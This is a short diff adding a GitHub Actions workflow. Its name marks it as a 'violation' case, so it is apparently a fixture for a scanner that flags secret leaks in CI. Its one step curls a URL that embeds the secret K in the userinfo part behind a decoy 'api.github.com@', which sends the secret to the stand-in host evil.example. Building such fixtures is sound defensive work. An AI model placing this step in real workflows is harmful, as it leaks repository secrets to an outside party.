@@ -1,0 +1,7 @@
+name: violation_userinfo_with_at_vcs_decoy
+on: push
+jobs:
+  push:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl "https://${{ secrets.K }}@api.github.com@evil.example/x"
